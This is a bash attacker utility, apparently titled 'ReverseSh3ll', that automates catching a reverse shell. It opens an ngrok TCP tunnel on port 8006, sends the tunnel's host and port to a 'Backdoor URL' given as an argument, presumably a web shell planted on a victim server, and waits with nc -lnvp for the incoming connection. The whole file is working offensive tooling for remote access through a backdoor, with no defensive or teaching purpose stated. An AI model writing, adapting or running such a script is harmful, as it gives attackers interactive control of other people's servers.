#!/usr/bin/bash
#Reverse Connection script
#Simple script to save time
#Coded By Yell Phone Naing

logo(){
echo -e "\e[1;34m
| ___ \                           /  ___| |    |____ | | |
| |_/ /_____   _____ _ __ ___  ___\ '--.| |__      / / | |\e[1;32m
|    // _ \ \ / / _ \ '__/ __|/ _ \'--. \ '_ \     \ \ | |
| |\ \  __/\ V /  __/ |  \__ \  __/\__/ / | | |.___/ / | |\e[1;31m
\_| \_\___| \_/ \___|_|  |___/\___\____/|_| |_|\____/|_|_|
                                                          
\e[0m"
}

reverse_connection() {
echo -en "\e[1;34mForwarding port with ngrok => "
ngrok tcp 8006  >/dev/null 2>&1 & sleep 5
ser=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o "tcp://[0-9a-z.]*\.ngrok.io:[0-9]*" | awk -F/ '{ print $3 }')
ip=$(echo $ser | awk -F: '{ print $1 }')
port=$(echo $ser | awk -F: '{ print $2 }')
if [[ $port != "" && $ip != "" ]];then
echo -e "\e[1;32mSuccess\e[0m"
(sleep 3; curl -ks "$url?ip=$ip&p=$port") & nc -lnvp 8006
else
echo -e "\e[1;31mFailed\e[0m"
exit
fi
echo -e "\e[0m"
}
check_commands(){
commands=(nc ngrok)
for cmd in ${commands[@]};do
command -v $cmd >/dev/null || (echo -e "\e[1;32mCommand ($cmd) is needed to run me.\e[0m" && exit)
done
reverse_connection
}
check_arg(){
if [[ $# == 0 ]];then
echo -e "\e[1;33mPlease Run The Script As bash $0 <Backdoor URL> \e[0m"
exit
else
check_commands
fi
}
main() {
url=$1
logo
check_arg $@
}
main $@
